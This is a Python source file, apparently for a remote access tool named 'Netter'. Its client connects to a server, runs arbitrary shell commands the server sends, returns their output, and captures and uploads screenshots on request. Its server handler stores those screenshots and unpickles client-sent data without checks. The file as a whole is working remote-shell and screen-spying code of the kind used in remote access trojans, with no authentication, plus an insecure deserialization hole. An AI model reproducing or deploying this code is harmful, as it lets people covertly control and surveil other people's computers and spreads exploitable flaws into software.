import threading, socket, subprocess, typing
import concurrent.futures, time, pickle
from loguru import logger

from PIL import ImageGrab
import io, zlib

if typing.TYPE_CHECKING:
    from .device import ClientDevice
    from .bucket import ConnectionBucket
    from .sock import NetterServer

class ClientWrapper:
    def __init__(self, connection: socket.socket, connectionAddress: tuple[str, int]) -> None:
        self.connection: socket.socket = connection
        self.connectionAddress: tuple[str, int] = connectionAddress

    def send_packet(self, data: str | bytes) -> int:
        if (isinstance(data, str)):
            data = data.encode('UTF-8')

        packetSize: bytes = len(data).to_bytes(4, 'big')
        self.connection.send(packetSize)
        self.connection.sendall(data)

        return int.from_bytes(packetSize, 'big')

    def receive_packet(self) -> bytes:
        packetSize: int = int.from_bytes(self.connection.recv(4), 'big')
        return self.connection.recv(packetSize)

    def connect(self) -> None:
        return self.connection.connect(self.connectionAddress)

class ServerHandler:
    """
    Client

    This is where the client should do whatever the server sents
    """
    def __init__(self, server_address: tuple[str, int], deviceData: bytes, additionalData: dict) -> None:
        self.server_address: tuple = server_address
        self.isConnected: bool = False

        self.socketInstance: ClientWrapper = ClientWrapper(
            socket.socket(socket.AF_INET, socket.SOCK_STREAM),
            server_address
        )

        self.socketInstance.connect()
        self.socketInstance.send_packet(deviceData)

        serverResponse: bytes = self.socketInstance.receive_packet()

        if (serverResponse == b'0'):
            self.socketInstance.send_packet(b'submit_additional_data ' + pickle.dumps(additionalData))
            self.isConnected = True
            return

    def run_command(self, message: bytes) -> None:
        output = subprocess.run(message.decode('UTF-8')[16:],
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
            shell = True
        )

        if output.stdout:
            self.socketInstance.send_packet(b'exec_response 0 ' + output.stdout)
            return

        self.socketInstance.send_packet(b'exec_response 1 ' + output.stderr)

    def start(self) -> None:

        while self.isConnected:
            message: bytes = self.socketInstance.receive_packet()

            if (not message):
                logger.info('Connection to the server has disconnected, attempting to reconnect..')
                self.isConnected = False

            if (message.startswith(b'execute_command ')):
                executor = concurrent.futures.ThreadPoolExecutor()
                future = executor.submit(self.run_command, message)

                try: future.result(timeout = 8)
                except concurrent.futures.TimeoutError:
                    self.socketInstance.send_packet('exec_response error')
                    continue

            if (message.startswith(b'request_screenshot')):
                try:
                    screenshot = ImageGrab.grab()

                except OSError:
                    self.socketInstance.send_packet('screenshot_response not_available')
                    continue

                screenshot.save(img := io.BytesIO(), format = 'PNG')
                data = zlib.compress(img.getvalue())

                self.socketInstance.send_packet(b'screenshot_response ' + data)

class ClientHandler(threading.Thread):
    def __init__(self, connection: 'ClientDevice', connectionAddress: tuple[str, int], connectionBucket: 'ConnectionBucket', NetterInstance: 'NetterServer') -> None:
        threading.Thread.__init__(self)

        self.conneciton: 'ClientDevice' = connection
        self.connecitonAddress: tuple[str, int] = connectionAddress
        self.NetterInstance: 'NetterServer' = NetterInstance

        self.connectionBucket = connectionBucket
        self.isConnected: bool = True

    def run(self) -> None:
        while self.isConnected:
            data: bytes = self.conneciton.socket.receive_packet()

            if not (data):
                logger.info(f'{self.conneciton.publib_address} ({self.conneciton.hostname}) just leave the server')
                self.connectionBucket.connectionList.remove(self.conneciton)
                self.isConnected = False

            if (data.startswith(b'submit_additional_data ')):
                clientAdditionalData: dict = pickle.loads(data[23:])
                self.conneciton.additionalData = clientAdditionalData

            if (data.startswith(b'exec_response ')):

                if (data[14:15] == b'0'):
                    logger.success('Command execution successful with exit code: 0')

                elif (data[14:15] == b'1'):
                    logger.error('Command execution failed with exit code: 1')

                else:
                    logger.error('Command execution has reached the timeout (8s), execution terminated.')
                    self.NetterInstance._waitingForResponse = False
                    continue

                print(data[16:].decode())
                self.NetterInstance._waitingForResponse = False

            if (data.startswith(b'screenshot_response ')):
                if (b'not_available' in data):
                    logger.error('Client device are not capable of taking screenshots.')
                    self.NetterInstance._waitingForResponse = False
                    continue

                fileName: str = f'output/{self.conneciton.hostname}-{str(time.time())}.png'
                screenImg: bytes = zlib.decompress(data[20:])

                with open(fileName, 'wb') as file:
                    file.write(screenImg)
                    file.close()

                logger.success(f'Screenshot has been save to {fileName}')
                self.NetterInstance._waitingForResponse = False
